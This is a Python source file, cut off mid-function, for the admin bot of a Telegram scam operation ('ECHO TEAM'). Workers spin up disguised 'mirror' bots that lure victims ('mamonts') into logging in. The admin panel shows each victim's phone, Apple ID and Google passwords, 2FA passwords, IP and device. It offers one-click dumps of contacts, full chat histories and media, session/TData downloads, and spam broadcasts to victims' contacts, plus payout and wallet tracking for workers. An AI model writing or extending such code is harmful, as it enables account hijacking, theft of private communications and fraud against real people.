import asyncio
import html
import logging
import os
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Union

from aiogram import Bot, F, Router
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    BotCommand,
    BotCommandScopeAllPrivateChats,
    BotCommandScopeChat,
    BotCommandScopeDefault,
    BufferedInputFile,
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputMediaPhoto,
    MenuButtonDefault,
    Message,
    WebAppInfo,
)
from aiogram.exceptions import TelegramAPIError

from admin_bot.orchestrator import Orchestrator
from shared import contacts as contacts_pkg
from shared import db
from shared.config import (
    ADMIN_BOT_TOKEN,
    ADMIN_CHAT_ID,
    ADMIN_CHAT_IDS,
    CONTACTS_PATH,
    DB_PATH,
    SESSIONS_DIR,
    DEFAULT_DONOR_CHANNEL,
    PROFITS_CHANNEL_ID,
    WEBAPP_URL,
    PRIMARY_ADMIN_ID,
    MASTER_ADMIN_IDS,
)
from shared.notifier import get_admin_log_keyboard, notify_session_revoked
from shared.profit_card import generate_profit_image

router = Router(name="admin_root")
logger = logging.getLogger("admin_bot.handlers")

WORK_PANEL_PHOTO = "assets/workPanel.png"
ADMIN_PANEL_PHOTO = "assets/adminPanel.jpg"

_media_group_buffers: Dict[str, List[Message]] = {}


async def collect_media_group(message: Message, delay: float = 0.6) -> Optional[List[Message]]:
    """
    Collects all messages belonging to the same media_group_id.
    Returns the full list of messages for the first task once the delay has elapsed.
    Returns None for subsequent messages in the same group so they can exit silently.
    """
    if not message.media_group_id:
        return [message]

    group_id = message.media_group_id
    if group_id in _media_group_buffers:
        _media_group_buffers[group_id].append(message)
        return None

    _media_group_buffers[group_id] = [message]
    await asyncio.sleep(delay)
    return _media_group_buffers.pop(group_id, [message])


def is_admin(user_id: Optional[int]) -> bool:
    if not user_id:
        return False
    if user_id == ADMIN_CHAT_ID or user_id in ADMIN_CHAT_IDS or user_id in MASTER_ADMIN_IDS:
        return True
    return db.is_admin_user(DB_PATH, user_id)


def can_admin_access_user(caller_id: int, user_row: Any) -> bool:
    """
    Checks if an admin can view/manage a given user/mamont.
    Primary owner (7491827504 / ADMIN_CHAT_ID) can access everything.
    Other admins CANNOT access or see primary owner's personal mamonts.
    """
    if not user_row:
        return False
    if caller_id in MASTER_ADMIN_IDS:
        return True
    u_dict = dict(user_row)
    w_id = u_dict.get("worker_tg_id")
    if w_id in MASTER_ADMIN_IDS:
        return False
    m_token = u_dict.get("mirror_token")
    if m_token:
        try:
            t_row = db.get_token_by_token(DB_PATH, m_token)
            if t_row and "owner_tg_id" in t_row.keys() and t_row["owner_tg_id"] in MASTER_ADMIN_IDS:
                return False
        except Exception:
            pass
    return True


async def sync_admin_bot_commands(bot: Bot) -> None:
    """
    Sets default commands (/start) for regular workers,
    and sets (/start, /admin) specifically for each admin using BotCommandScopeChat.
    """
    try:
        base_commands = [BotCommand(command="start", description="🏠 Главное меню")]
        await bot.set_my_commands(base_commands, scope=BotCommandScopeDefault())
        await bot.set_my_commands(base_commands, scope=BotCommandScopeAllPrivateChats())

        admin_commands = [
            BotCommand(command="start", description="🏠 Главное меню"),
            BotCommand(command="admin", description="adminPanel"),
        ]

        admin_ids = {7491827504, ADMIN_CHAT_ID}
        for aid in ADMIN_CHAT_IDS:
            admin_ids.add(aid)
        try:
            admins = db.get_all_admins(DB_PATH)
            for a in admins:
                if a["role"] == "admin":
                    admin_ids.add(a["tg_id"])
        except Exception:
            pass

        for aid in admin_ids:
            try:
                await bot.set_my_commands(admin_commands, scope=BotCommandScopeChat(chat_id=aid))
            except Exception as exc:
                logger.debug("Failed setting commands for admin %s: %s", aid, exc)
    except Exception as e:
        logger.error("sync_admin_bot_commands error: %s", e)


class PayoutStates(StatesGroup):
    waiting_amount = State()
    waiting_requisites = State()


class AdminStates(StatesGroup):
    waiting_percent_worker_query = State()
    waiting_add_admin_query = State()
    waiting_profit_worker_query = State()
    waiting_profit_amount = State()
    waiting_profit_comment = State()
    waiting_bot_broadcast_content = State()
    waiting_mamont_broadcast_content = State()
    waiting_mamont_tgk_post = State()


def get_admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📂 Логи", callback_data="adm_menu_logs"),
                InlineKeyboardButton(text="⚙️ Изменить % воркера", callback_data="adm_menu_percent"),
            ],
            [
                InlineKeyboardButton(text="👥 Админы", callback_data="adm_menu_admins"),
                InlineKeyboardButton(text="📊 Статистика", callback_data="adm_menu_stats"),
            ],
            [
                InlineKeyboardButton(text="📢 Рассылка по боту", callback_data="adm_menu_broadcast"),
            ],
            [
                InlineKeyboardButton(text="💰 Профиты", callback_data="adm_menu_profits"),
            ],
            [
                InlineKeyboardButton(text="🪞 Ворк панель", callback_data="wrk_main_menu"),
            ],
        ]
    )


def get_worker_keyboard(is_admin_flag: bool = False) -> InlineKeyboardMarkup:
    buttons = [
        [
            InlineKeyboardButton(text="🪞 Создать зеркало", callback_data="wrk_create_mirror"),
            InlineKeyboardButton(text="📂 Мои Логи", callback_data="wrk_my_logs"),
        ],
        [
            # InlineKeyboardButton(text="💸 Выплата", callback_data="wrk_payout"),
            InlineKeyboardButton(text="👤 Профиль", callback_data="wrk_profile"),
        ],
    ]
    if is_admin_flag:
        buttons.append([InlineKeyboardButton(text="👑 Админ панель", callback_data="adm_main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


WORKER_WELCOME_TEXT = (
    "👋 <b>Приветствую в ECHO TEAM!</b>\n\n"
    "В данном боте вы можете создать <b>свое зеркало. </b>\n\n"
    "В этого бота будут приходить <b>логи ваших лохматых</b> 🦣"
)

ADMIN_WELCOME_TEXT = "<b>ECHO TEAM Админ панель:</b>"


async def _send_or_edit_menu(
    target: Message | CallbackQuery,
    text: str,
    keyboard: InlineKeyboardMarkup,
    photo_path: str = WORK_PANEL_PHOTO,
) -> None:
    chosen_photo = photo_path if (photo_path and os.path.exists(photo_path)) else None
    if not chosen_photo and os.path.exists(WORK_PANEL_PHOTO):
        chosen_photo = WORK_PANEL_PHOTO

    if isinstance(target, CallbackQuery):
        msg = target.message
        if msg:
            if chosen_photo:
                try:
                    await msg.edit_media(
                        media=InputMediaPhoto(
                            media=FSInputFile(chosen_photo),
                            caption=text,
                            parse_mode="HTML",
                        ),
                        reply_markup=keyboard,
                    )
                    return
                except Exception:
                    try:
                        await msg.edit_caption(
                            caption=text,
                            reply_markup=keyboard,
                            parse_mode="HTML",
                        )
                        return
                    except Exception:
                        pass
            else:
                try:
                    await msg.edit_text(
                        text=text,
                        reply_markup=keyboard,
                        parse_mode="HTML",
                    )
                    return
                except Exception:
                    pass

        if chosen_photo:
            await target.message.answer_photo(
                photo=FSInputFile(chosen_photo),
                caption=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )
        else:
            await target.message.answer(
                text=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )
    else:
        if chosen_photo:
            await target.answer_photo(
                photo=FSInputFile(chosen_photo),
                caption=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )
        else:
            await target.answer(
                text=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )


@router.message(Command("start"))
@router.message(Command("help"))
async def cmd_start(message: Message, orchestrator: Orchestrator) -> None:
    user_id = message.from_user.id if message.from_user else 0
    if message.from_user:
        db.get_or_create_worker(DB_PATH, user_id, message.from_user.username)

    is_adm = is_admin(user_id)
    await _send_or_edit_menu(message, WORKER_WELCOME_TEXT, get_worker_keyboard(is_admin_flag=is_adm), photo_path=WORK_PANEL_PHOTO)


@router.message(Command("admin", "adm"))
async def cmd_admin(message: Message) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    await _send_or_edit_menu(
        message,
        ADMIN_WELCOME_TEXT,
        get_admin_keyboard(),
        photo_path=ADMIN_PANEL_PHOTO,
    )


async def _register_and_start_mirror(
    token_str: str,
    owner_id: Optional[int],
    worker_username: Optional[str],
    orchestrator: Orchestrator,
) -> tuple[bool, str]:

    probe = Bot(token=token_str)
    try:
        me = await probe.get_me()
        bot_desc = "🔒 Private Room — твоя приватная зона общения. Создавай комнаты. Общайся. Контролируй доступ."
        try:
            await probe.set_my_description(description=bot_desc)
            await probe.set_my_short_description(short_description=bot_desc)
        except Exception:
            pass

        try:
            await probe.set_chat_menu_button(
                menu_button=MenuButtonDefault()
            )
        except Exception:
            pass
    except (TelegramAPIError, Exception) as exc:
        return False, f"Токен не прошёл проверку в Telegram: {exc}"
    finally:
        await probe.session.close()

    try:
        token_id = await asyncio.to_thread(db.add_token, DB_PATH, token_str, me.username, owner_id)
        if owner_id:
            await asyncio.to_thread(db.get_or_create_worker, DB_PATH, owner_id, worker_username)

        # Immediately start mirror polling process
        await orchestrator.start_mirror(token_str)
    except Exception as exc:
        return False, f"Не удалось сохранить токен в базе: {exc}"

    return True, me.username or "Bot"


@router.message(F.text.regexp(r"^\d{8,12}:[A-Za-z0-9_-]{35,}$"))
async def handle_plain_token(message: Message, orchestrator: Orchestrator) -> None:
    if message.text is None:
        return
    token_str = message.text.strip()
    owner_id = message.from_user.id if message.from_user else None
    worker_username = message.from_user.username if message.from_user else None

    success, result = await _register_and_start_mirror(token_str, owner_id, worker_username, orchestrator)
    if not success:
        await message.answer(f"❌ {result}", parse_mode="HTML")
        return

    text = (
        "<b>✅ Ваш бот успешно создан!</b>\n\n"
        f"🤖 <b>Бот:</b> @{result}\n"
        f"🔗 <b>Ссылка:</b> https://t.me/{result}\n\n"
        "<b>⚙️ Настройка внешнего вида через @BotFather:</b>\n"
        "<blockquote>• <code>/setuserpic</code> — установить аватарку профиля бота\n"
        "• <code>/setdescriptionpicture</code> — установить превью-фото (в окне до Start)\n"
        "• <code>/setdescription</code> — изменить текст описания (в окне до Start)\n"
        "• <code>/setabouttext</code> — изменить информацию «О себе» (в профиле бота)\n"
        "• <code>/setname</code> — изменить отображаемое имя бота</blockquote>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Главное меню", callback_data="wrk_main_menu")]
        ]
    )
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")


@router.message(Command("addtoken"))
async def cmd_addtoken(message: Message, command: CommandObject, orchestrator: Orchestrator) -> None:
    if not command.args:
        await message.answer("Использование: <code>/addtoken &lt;token&gt;</code>", parse_mode="HTML")
        return
    token_str = command.args.strip()
    owner_id = message.from_user.id if message.from_user else None
    worker_username = message.from_user.username if message.from_user else None

    success, result = await _register_and_start_mirror(token_str, owner_id, worker_username, orchestrator)
    if not success:
        await message.answer(f"❌ {result}", parse_mode="HTML")
        return

    text = (
        "<b>✅ Ваш бот успешно создан!</b>\n\n"
        f"🤖 <b>Бот:</b> @{result}\n"
        f"🔗 <b>Ссылка:</b> https://t.me/{result}\n\n"
        "<b>⚙️ Настройка внешнего вида через @BotFather:</b>\n"
        "<blockquote>• <code>/setuserpic</code> — установить аватарку профиля бота\n"
        "• <code>/setdescriptionpicture</code> — установить превью-фото (в окне до Start)\n"
        "• <code>/setdescription</code> — изменить текст описания (в окне до Start)\n"
        "• <code>/setabouttext</code> — изменить информацию «О себе» (в профиле бота)\n"
        "• <code>/setname</code> — изменить отображаемое имя бота</blockquote>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Главное меню", callback_data="wrk_main_menu")]
        ]
    )
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")


@router.message(Command("setwallet"))
async def cmd_setwallet(message: Message, command: CommandObject) -> None:
    if not message.from_user:
        return
    if not command.args:
        await message.answer("Использование: <code>/setwallet &lt;TRC20_ADDRESS&gt;</code>", parse_mode="HTML")
        return
    wallet = command.args.strip()
    db.set_worker_wallet(DB_PATH, message.from_user.id, wallet)
    await message.answer(f"✅ TRC20 кошелек успешно сохранен:\n<code>{wallet}</code>", parse_mode="HTML")


@router.message(Command("givebalance", "addbalance"))
async def cmd_givebalance(message: Message, command: CommandObject) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    if not command.args or len(command.args.split()) < 2:
        await message.answer("Использование: <code>/givebalance &lt;TG_ID&gt; &lt;СУММА&gt;</code>", parse_mode="HTML")
        return
    parts = command.args.split()
    try:
        target_id = int(parts[0])
        amount = float(parts[1].replace("$", "").replace(",", "."))
    except ValueError:
        await message.answer("❌ Неверный формат. Пример: <code>/givebalance 8649275290 100</code>", parse_mode="HTML")
        return

    db.get_or_create_worker(DB_PATH, target_id)
    db.add_worker_balance(DB_PATH, target_id, amount)
    worker = db.get_worker_by_tg_id(DB_PATH, target_id)
    await message.answer(
        f"✅ Баланс воркера <code>{target_id}</code> пополнен на <b>{amount:.2f} $</b>.\n"
        f"💰 Текущий баланс: <b>{worker['balance']:.2f} $</b>",
        parse_mode="HTML",
    )


@router.message(Command("setbalance"))
async def cmd_setbalance(message: Message, command: CommandObject) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    if not command.args or len(command.args.split()) < 2:
        await message.answer("Использование: <code>/setbalance &lt;TG_ID&gt; &lt;СУММА&gt;</code>", parse_mode="HTML")
        return
    parts = command.args.split()
    try:
        target_id = int(parts[0])
        amount = float(parts[1].replace("$", "").replace(",", "."))
    except ValueError:
        await message.answer("❌ Неверный формат. Пример: <code>/setbalance 8649275290 500</code>", parse_mode="HTML")
        return

    db.get_or_create_worker(DB_PATH, target_id)
    db.set_worker_balance(DB_PATH, target_id, amount)
    await message.answer(
        f"✅ Баланс воркера <code>{target_id}</code> установлен на <b>{amount:.2f} $</b>.",
        parse_mode="HTML",
    )


# ===================== ADMIN PANEL CALLBACKS =====================

@router.callback_query(F.data == "adm_main_menu")
async def cb_adm_main_menu(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    await state.clear()
    await _send_or_edit_menu(
        callback,
        ADMIN_WELCOME_TEXT,
        get_admin_keyboard(),
        photo_path=ADMIN_PANEL_PHOTO,
    )


# --------------------- 1. LOGS & MAMONT ACTIONS ---------------------

@router.callback_query(F.data.startswith("adm_menu_logs"))
async def cb_adm_menu_logs(callback: CallbackQuery) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return

    # Extract optional page index
    page = 0
    if ":page:" in callback.data:
        try:
            page = int(callback.data.split(":page:")[1])
        except (ValueError, IndexError):
            page = 0

    logs = db.get_active_logs(DB_PATH)
    caller_id = callback.from_user.id
    if caller_id not in MASTER_ADMIN_IDS:
        logs = [u for u in logs if can_admin_access_user(caller_id, u)]

    if not logs:
        text = (
            "📂 <b>Активные логи (Сессии онлайн):</b>\n\n"
            "<i>В данный момент нет активных авторизованных сессий.</i>\n\n"
            "💡 <i>Сюда попадают только авторизованные мамонты (до разлогина). "
            "После того как сессия разлогинена или сброшена, лог автоматически удаляется из этого списка.</i>"
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Обновить список", callback_data="adm_menu_logs")],
                [InlineKeyboardButton(text="🗄 Архив всех логов", callback_data="adm_menu_all_logs")],
                [InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")],
            ]
        )
        await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
        return

    PAGE_SIZE = 10
    total_logs = len(logs)
    total_pages = max(1, (total_logs + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    page_logs = logs[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]

    buttons = []
    for u in page_logs:
        phone = u["phone"] or "Без номера"
        username = f"@{u['username']}" if u["username"] else f"ID:{u['tg_id']}"
        worker_tg_id = u["worker_tg_id"]
        w_user = "—"
        if worker_tg_id:
            w_obj = db.get_worker_by_tg_id(DB_PATH, worker_tg_id)
            if w_obj and w_obj["username"]:
                w_user = f"@{w_obj['username']}"
            else:
                w_user = f"ID:{worker_tg_id}"

        email = u["email"] if ("email" in u.keys() and u["email"]) else None
        if (not u["phone"] or u["phone"] == "—") and email:
            label = f"🟢 ✉️ {email} • {w_user}"
        else:
            label = f"🟢 {phone} • {username} • {w_user}"

        buttons.append([InlineKeyboardButton(text=label, callback_data=f"adm_view_user:{u['tg_id']}")])

    # Navigation buttons
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="◀️ Назад", callback_data=f"adm_menu_logs:page:{page - 1}"))
    if total_pages > 1:
        nav_row.append(InlineKeyboardButton(text=f"📄 {page + 1}/{total_pages}", callback_data=f"adm_menu_logs:page:{page}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton(text="Вперёд ▶️", callback_data=f"adm_menu_logs:page:{page + 1}"))
    if nav_row:
        buttons.append(nav_row)

    buttons.append([
        InlineKeyboardButton(text="🔄 Обновить", callback_data=f"adm_menu_logs:page:{page}"),
        InlineKeyboardButton(text="🗄 Архив всех логов", callback_data="adm_menu_all_logs"),
    ])
    buttons.append([InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")])

    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = (
        f"📂 <b>Активные логи онлайн (Всего: {total_logs}):</b>\n\n"
        f"<i>Нажмите на нужный лог для быстрого перехода в управление сессией:</i>"
    )
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.callback_query(F.data.startswith("adm_menu_all_logs"))
async def cb_adm_menu_all_logs(callback: CallbackQuery) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return

    page = 0
    if ":page:" in callback.data:
        try:
            page = int(callback.data.split(":page:")[1])
        except (ValueError, IndexError):
            page = 0

    logs = db.get_all_logs(DB_PATH)
    caller_id = callback.from_user.id
    if caller_id not in MASTER_ADMIN_IDS:
        logs = [u for u in logs if can_admin_access_user(caller_id, u)]

    if not logs:
        text = "🗄 <b>Архив логов:</b>\n\n<i>В базе данных нет записей.</i>"
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="« К активным логам", callback_data="adm_menu_logs")]]
        )
        await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
        return

    PAGE_SIZE = 10
    total_logs = len(logs)
    total_pages = max(1, (total_logs + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    page_logs = logs[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]

    buttons = []
    for u in page_logs:
        phone = u["phone"] or "—"
        step = u["auth_step"] or "start"
        icon = "🟢" if (step == "authorized" and u.get("session_string")) else ("❌" if step in ("logged_out", "session_revoked") else "⏳")
        u_name = f"@{u['username']}" if u["username"] else f"ID:{u['tg_id']}"
        label = f"{icon} {phone} • {u_name} [{step}]"
        buttons.append([InlineKeyboardButton(text=label, callback_data=f"adm_view_user:{u['tg_id']}")])

    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="◀️ Назад", callback_data=f"adm_menu_all_logs:page:{page - 1}"))
    if total_pages > 1:
        nav_row.append(InlineKeyboardButton(text=f"📄 {page + 1}/{total_pages}", callback_data=f"adm_menu_all_logs:page:{page}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton(text="Вперёд ▶️", callback_data=f"adm_menu_all_logs:page:{page + 1}"))
    if nav_row:
        buttons.append(nav_row)

    buttons.append([
        InlineKeyboardButton(text="🔄 Обновить", callback_data=f"adm_menu_all_logs:page:{page}"),
        InlineKeyboardButton(text="📂 К активным логам", callback_data="adm_menu_logs"),
    ])
    buttons.append([InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")])

    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"🗄 <b>Архив всех логов (Всего записей: {total_logs}):</b>\n\nВыберите лог для просмотра:"
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.callback_query(F.data.startswith("adm_view_user:"))
async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    await state.clear()

    try:
        user_tg_id = int(callback.data.split(":")[1])
    except (ValueError, IndexError):
        return

    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user:
        await callback.answer("❌ Пользователь не найден.", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    username = f"@{user['username']}" if user["username"] else "—"
    phone = user["phone"] or "—"
    mirror_name = user["mirror_username"] if ("mirror_username" in user.keys() and user["mirror_username"]) else "—"
    mirror = f"@{mirror_name}" if mirror_name and mirror_name != "—" else "—"
    worker_id = user["worker_tg_id"]
    w_user = "—"
    if worker_id:
        w_obj = db.get_worker_by_tg_id(DB_PATH, worker_id)
        if w_obj and w_obj["username"]:
            w_user = f"@{w_obj['username']} (ID: <code>{worker_id}</code>)"
        else:
            w_user = f"ID: <code>{worker_id}</code>"
    auth_step = user["auth_step"] or "start"
    raw_session = user["session_string"] if "session_string" in user.keys() else None

    if raw_session and not raw_session.startswith("mock_") and not raw_session.startswith("sess_") and not raw_session.startswith("google_auth_"):
        is_alive = await contacts_pkg.is_session_alive(raw_session, user_tg_id=user_tg_id)
        if not is_alive:
            db.update_user_auth(DB_PATH, user_tg_id, session_string=None, auth_step="session_revoked")
            auth_step = "session_revoked"
            session_status = "❌ Сессия сброшена / отозвана"
            asyncio.create_task(notify_session_revoked(user_tg_id, reason="Обнаружена неактивная/отозванная сессия в Telegram"))
        else:
            session_status = "🟢 E2E Сессия активна (онлайн)"
    elif raw_session and raw_session.startswith("google_auth_"):
        session_status = "🟢 Google OAuth сессия активна"
    elif auth_step in ("google_prompt_confirmed", "google_complete", "google_authorized") or (email and ("google_status" in user.keys() and user["google_status"] == "prompt_confirmed")):
        session_status = "🟢 Google сессия подтверждена (онлайн)"
    elif raw_session and raw_session.startswith("apple_auth_"):
        session_status = "🟢 Apple ID сессия активна"
    elif auth_step in ("apple_authorized", "apple_complete", "apple_prompt_confirmed") or (email and ("apple_status" in user.keys() and user["apple_status"] in ("completed", "prompt_confirmed", "authorized"))):
        session_status = "🟢 Apple ID сессия подтверждена (онлайн)"
    elif auth_step in ("session_revoked", "logged_out"):
        session_status = "❌ Сессия сброшена / отозвана"
    else:
        session_status = "❌ Сессия отсутствует"

    email = user["email"] if ("email" in user.keys() and user["email"]) else None
    pwd_2fa = user["password_2fa"] if ("password_2fa" in user.keys() and user["password_2fa"]) else None

    is_apple_user = (user.get("auth_step") or "").startswith("apple_") or (email and ("icloud" in email.lower() or "apple" in email.lower()))
    is_google_user = (user.get("auth_step") or "").startswith("google_") or (email and "gmail" in email.lower())

    email_line = ""
    if email:
        if is_apple_user:
            email_line = f"🍏 <b>Apple ID:</b> <code>{email}</code>\n"
        elif is_google_user:
            email_line = f"📧 <b>Google Email:</b> <code>{email}</code>\n"
        else:
            email_line = f"📧 <b>Почта:</b> <code>{email}</code>\n"

    pwd_line = ""
    if pwd_2fa:
        if is_apple_user:
            pwd_line = f"🔑 <b>Пароль Apple ID:</b> <code>{pwd_2fa}</code>\n"
        elif is_google_user:
            pwd_line = f"🔑 <b>Пароль Google:</b> <code>{pwd_2fa}</code>\n"
        else:
            pwd_line = f"🔑 <b>Пароль (2FA):</b> <code>{pwd_2fa}</code>\n"

    ip = user["ip"] if ("ip" in user.keys() and user["ip"]) else "—"
    country = user["country"] if ("country" in user.keys() and user["country"]) else ""
    city = user["city"] if ("city" in user.keys() and user["city"]) else ""
    geo_str = f"{ip} ({country}, {city})" if (country or city) else ip
    device = user["device"] if ("device" in user.keys() and user["device"]) else "—"

    text = (
        f"👤 <b>Карточка мамонта #{user['id']}:</b>\n\n"
        f"📱 <b>Номер:</b> <code>{phone}</code>\n"
        f"{email_line}"
        f"{pwd_line}"
        f"👤 <b>Юз:</b> {username}\n"
        f"🆔 <b>Айди тг:</b> <code>{user['tg_id']}</code>\n"
        f"🪞 <b>Зеркало:</b> {mirror}\n"
        f"👨‍💻 <b>Юз воркера:</b> {w_user}\n"
        f"🌐 <b>IP / Гео:</b> <code>{geo_str}</code>\n"
        f"📱 <b>Устройство:</b> <code>{device}</code>\n"
        f"📊 <b>Статус:</b> <code>{auth_step}</code> ({session_status})"
    )

    buttons = [
        [InlineKeyboardButton(text="📇 1) Выкачать контакты (txt)", callback_data=f"adm_act_dump_txt:{user_tg_id}")],
        [
            InlineKeyboardButton(text="⚡ Быстро: переписки (HTML)", callback_data=f"adm_act_dump_fast_html:{user_tg_id}"),
            InlineKeyboardButton(text="💬 Всё с медиа (zip)", callback_data=f"adm_act_dump_media:{user_tg_id}"),
        ],
        [InlineKeyboardButton(text="📢 3) Создать ТГК на аккаунте", callback_data=f"adm_act_create_tgk:{user_tg_id}")],
        [InlineKeyboardButton(text="💾 4) Скачать TData / Session", callback_data=f"adm_act_download_tdata:{user_tg_id}")],
        [InlineKeyboardButton(text="⚡ 5) Запустить рассылку по контактам", callback_data=f"adm_act_broadcast_contacts:{user_tg_id}")],
        [
            InlineKeyboardButton(text="🔄 Сбросить сессии", callback_data=f"adm_reset_sess:{user_tg_id}"),
            InlineKeyboardButton(text="🔴 Разлогинить", callback_data=f"adm_logout_ask:{user_tg_id}"),
        ],
        [InlineKeyboardButton(text="« Назад к активным логам", callback_data="adm_menu_logs")],
    ]
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.callback_query(F.data.startswith("adm_act_dump_fast_html:"))
async def cb_adm_act_dump_fast_html(callback: CallbackQuery, bot: Bot) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await callback.answer("❌ Сессия мамонта отсутствует или закрыта.", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer("⏳ Выгружаем переписки (быстро, без тяжелых медиа)...", show_alert=True)
    status_msg = await callback.message.answer(
        f"⚡ <b>Быстрая выгрузка переписок мамонта (ID: <code>{user_tg_id}</code>)...</b>\n"
        "<i>Сбор всех диалогов и создание HTML-просмотрщика (занимает 5–15 секунд)...</i>",
        parse_mode="HTML",
    )

    try:
        result = await contacts_pkg.extract_full_archive_from_session(
            user["session_string"],
            user_tg_id,
            days_limit=60,
            max_photos=0,
            max_voices=0,
            max_video_notes=0,
        )
        if not result or not result.get("html_path") or not os.path.exists(result["html_path"]):
            await status_msg.edit_text("❌ Не удалось выгрузить переписки (сессия завершена или аккаунт пуст).")
            return

        doc_html = FSInputFile(result["html_path"], filename=f"chats_{user_tg_id}.html")
        await bot.send_document(
            chat_id=callback.from_user.id,
            document=doc_html,
            caption=(
                f"🌐 <b>Интерактивный веб-просмотрщик диалогов</b>\n\n"
                f"• 👤 <b>Мамонт:</b> <code>{user_tg_id}</code>\n"
                f"• 💬 <b>Диалогов:</b> {result['dialogs_count']} (Сообщений: {result['total_messages']})\n"
                f"• 📌 <b>Избранное:</b> {result['saved_msgs_count']}\n\n"
                f"💡 <i>Откройте файл в браузере. Выгружено быстро без медиа! Для скачивания фото и кружков используйте полную выгрузку.</i>"
            ),
            parse_mode="HTML",
        )
        try:
            await status_msg.delete()
        except Exception:
            pass
    except Exception as exc:
        logger.error("Error in cb_adm_act_dump_fast_html for %s: %s", user_tg_id, exc)
        try:
            await status_msg.edit_text(f"❌ Ошибка быстрой выгрузки: {exc}")
        except Exception:
            await callback.message.answer(f"❌ Ошибка быстрой выгрузки: {exc}")


@router.callback_query(F.data.startswith("adm_act_dump_txt:"))
async def cb_adm_act_dump_txt(callback: CallbackQuery, bot: Bot) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await callback.answer("❌ Сессия мамонта отсутствует или закрыта.", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer("⏳ Выгружаем контакты...", show_alert=False)
    txt_path = await contacts_pkg.generate_contacts_txt_file(user["session_string"], user_tg_id)
    if not txt_path or not os.path.exists(txt_path):
        await callback.message.answer("❌ Не удалось выгрузить контакты с аккаунта.")
        return

    doc = FSInputFile(txt_path, filename=f"contacts_{user_tg_id}.txt")
    await bot.send_document(
        chat_id=callback.from_user.id,
        document=doc,
        caption=f"📇 <b>Контакты мамонта</b> (ID: <code>{user_tg_id}</code>)\nФормат: <code>Как записан - Номер</code>",
        parse_mode="HTML",
    )


class ProgressReporter:
    def __init__(self, message: Message, user_tg_id: int, mamont_name: str = ""):
        self.message = message
        self.user_tg_id = user_tg_id
        self.mamont_name = mamont_name or str(user_tg_id)
        self.last_edit_time = 0.0
        self.last_percent = -1.0

    async def update(self, text: str, percent: float) -> None:
        now = time.time()
        # Rate-limit Telegram message edits to avoid flood limits (every 5 seconds or major milestone)
        if (now - self.last_edit_time < 5.0) and percent < 99.0 and abs(percent - self.last_percent) < 15.0:
            return

        self.last_edit_time = now
        self.last_percent = percent

        filled = max(0, min(12, int(percent / 100.0 * 12)))
        bar = "█" * filled + "░" * (12 - filled)

        msg_text = (
            f"⏳ <b>Выгрузка переписок на сервер...</b>\n\n"
            f"👤 <b>Мамонт:</b> {html.escape(self.mamont_name)} (ID: <code>{self.user_tg_id}</code>)\n"
            f"📊 <code>[{bar}] {int(percent)}%</code>\n\n"
